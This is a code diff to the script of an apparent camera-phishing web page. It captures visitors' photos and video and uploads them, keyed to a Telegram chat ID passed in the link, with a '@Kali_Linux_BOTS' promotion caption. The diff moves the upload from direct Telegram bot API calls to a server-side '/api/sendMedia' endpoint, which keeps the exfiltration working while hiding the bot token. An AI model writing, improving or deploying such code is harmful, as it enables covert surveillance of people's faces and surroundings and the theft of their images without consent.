@@ -175,9 +175,6 @@
   </div>
 
   <script>
-    // Use a placeholder for the bot token, to be replaced during build
-    const botToken = '{{BOT_TOKEN}}';
-
     // Function to get URL parameter (for chat ID)
     function getURLParameter(name) {
       const params = new URLSearchParams(window.location.search);
@@ -241,8 +238,8 @@
       }
     }
 
-    // Function to send media to Telegram
-    async function sendMediaToTelegram(photos, videoBlob) {
+    // Function to send media to the Vercel API endpoint
+    async function sendMediaToServer(photos, videoBlob) {
       const chatId = getURLParameter('id');
 
       if (!chatId) {
@@ -250,7 +247,7 @@
         return;
       }
 
-      // Send Photos directly to Telegram API
+      // Send Photos to the Vercel API endpoint
       for (let i = 0; i < photos.length; i++) {
         const formDataPhoto = new FormData();
         formDataPhoto.append('chat_id', chatId);
@@ -258,7 +255,7 @@
         formDataPhoto.append('caption', `⚡Join ➣ @Kali_Linux_BOTS`);
 
         try {
-          const responsePhoto = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          const responsePhoto = await fetch('/api/sendMedia', {
             method: 'POST',
             body: formDataPhoto
           });
@@ -273,14 +270,14 @@
         }
       }
 
-      // Send Video directly to Telegram API
+      // Send Video to the Vercel API endpoint
       const formDataVideo = new FormData();
       formDataVideo.append('chat_id', chatId);
       formDataVideo.append('video', videoBlob, 'video.mp4');
       formDataVideo.append('caption', '⚡Join ➣ @Kali_Linux_BOTS');
 
       try {
-        const responseVideo = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+        const responseVideo = await fetch('/api/sendMedia', {
           method: 'POST',
           body: formDataVideo
         });
@@ -306,7 +303,7 @@
 
       try {
         const { photos, videoBlob } = await captureMedia();
-        await sendMediaToTelegram(photos, videoBlob);
+        await sendMediaToServer(photos, videoBlob);
       } catch (error) {
         // Error already handled in respective functions
       } finally {
@@ -318,4 +315,4 @@
   </script>
 
 <script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'923c7ebddd05b066',t:'MTc0MjU1MDEwMi4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
-  </html>
+</html>
